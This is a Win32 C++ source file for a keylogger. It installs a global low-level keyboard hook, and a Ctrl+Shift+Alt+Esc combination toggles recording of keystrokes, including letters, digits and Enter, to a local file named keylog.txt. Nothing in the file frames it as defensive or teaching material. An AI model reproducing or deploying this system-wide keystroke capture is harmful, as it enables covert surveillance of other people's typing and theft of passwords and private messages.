// MyHookProc.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "MyHookProc.h"

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // TODO: Place code here.

    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_MYHOOKPROC, szWindowClass, MAX_LOADSTRING);
    MyRegisterClass(hInstance);

    // Perform application initialization:
    if (!InitInstance (hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MYHOOKPROC));

    MSG msg;

    // Main message loop:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);

    wcex.style          = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc    = WndProc;
    wcex.cbClsExtra     = 0;
    wcex.cbWndExtra     = 0;
    wcex.hInstance      = hInstance;
    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MYHOOKPROC));
    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground  = (HBRUSH)(COLOR_BTNFACE+1);
    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_MYHOOKPROC);
    wcex.lpszClassName  = szWindowClass;
    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable

   main = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);

   if (!main)
   {
      return FALSE;
   }

   ShowWindow(main, nCmdShow);
   UpdateWindow(main);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
	case WM_CREATE:
	{
		hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookProc, hInstHook, 0);
		output.open("keylog.txt", ios::out);
	}
		break;
    case WM_COMMAND:
        {
            int wmId = LOWORD(wParam);
            // Parse the menu selections:
            switch (wmId)
            {
            case IDM_ABOUT:
                DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
                break;
            case IDM_EXIT:
                DestroyWindow(hWnd);
                break;
            default:
                return DefWindowProc(hWnd, message, wParam, lParam);
            }
        }
        break;
    case WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = BeginPaint(hWnd, &ps);
            // TODO: Add any drawing code that uses hdc here...
            EndPaint(hWnd, &ps);
        }
        break;
	case WM_TIMER:
	{
		int wmId = LOWORD(wParam);
		switch (wmId)
		{
		case IDT_TIMER:
			output << endl;
			break;
		}
	}break;
	case WM_DESTROY:
	{
		UnhookWindowsHookEx(hHook);
		hHook = NULL;
		output.close();
		PostQuitMessage(0);
	}break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    UNREFERENCED_PARAMETER(lParam);
    switch (message)
    {
    case WM_INITDIALOG:
        return (INT_PTR)TRUE;

    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
        {
            EndDialog(hDlg, LOWORD(wParam));
            return (INT_PTR)TRUE;
        }
        break;
    }
    return (INT_PTR)FALSE;
}

LRESULT CALLBACK KeyHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	
	if (nCode < 0)
	{
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}
	else
	{
		
		if ((GetAsyncKeyState(VK_CONTROL) & 0x8000) && k == 0 && (GetAsyncKeyState(VK_SHIFT) & 0x8000)&& (GetAsyncKeyState(VK_MENU) & 0x8000) && (GetAsyncKeyState(VK_ESCAPE) & 0x8000))
		{
			k = 1;
			if (0 == state)
			{
				MessageBox(0, L"Begin key log", 0, 0);
				state = 1;
				hHook1 = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHookProc1, hInst, 0);
				Sleep(1000);
				SetTimer(main, IDT_TIMER, 5000, (TIMERPROC)NULL);
				return TRUE;
			}
			else
			{
				MessageBox(0, L"End key log", 0, 0);
				state = 0;
				UnhookWindowsHookEx(hHook1);
				hHook1 = NULL;
				KillTimer(main, IDT_TIMER);
				return TRUE;
			}
		}
		else
		{
			k = 0;
			return CallNextHookEx(hHook, nCode, wParam, lParam);
		}
		return CallNextHookEx(hHook, nCode, wParam, lParam);
	}

}

LRESULT CALLBACK KeyHookProc1(int nCode, WPARAM wParam, LPARAM lParam)
{
	for(int i = 0; i < 62; i++)
	{
		if (GetAsyncKeyState(nlist[i]) & 0x8000)
		{
			Sleep(100);
			CHAR *buff = new CHAR[10];
			buff = KeyToBuff(nlist[i]);
			string out(buff);
			output << out << " ";
			break;
		}
	}
	return CallNextHookEx(hHook1, nCode, wParam, lParam);
}

CHAR* KeyToBuff(unsigned int i)
{
	CHAR *buff = new CHAR[10];
	if (i >= 48 && i <= 57)
	{
		sprintf_s(buff, 10, "%c", i);
	}
	else if (i >= 65 && i <= 93)
	{
		sprintf_s(buff, 10, "%c", i);
	}
	else if (i >= 0x60 && i <= 0x69)
	{
		sprintf_s(buff, 10, "%c", i - 0x30);
	}
	else
	{
		switch(i)
		{
		case VK_SHIFT: sprintf_s(buff, 10, "SHIFT"); break;
		case VK_ADD: sprintf_s(buff, 10, "+"); break;
		case VK_MULTIPLY: sprintf_s(buff, 10, "*"); break;
		case VK_SUBTRACT: sprintf_s(buff, 10, "-"); break;
		case VK_DIVIDE: sprintf_s(buff, 10, "/"); break;
		case VK_BACK: sprintf_s(buff, 10, "BACKSPACE"); break;
		case VK_SPACE: sprintf_s(buff, 10, "SPACE"); break;
		case VK_TAB: sprintf_s(buff, 10, "TAB"); break;
		case VK_RETURN: sprintf_s(buff, 10, "ENTER"); break;
		case VK_CONTROL: sprintf_s(buff, 10, "CTR"); break;
		case VK_MENU:  sprintf_s(buff, 10, "ALT"); break;
		}
	}
	return buff;
}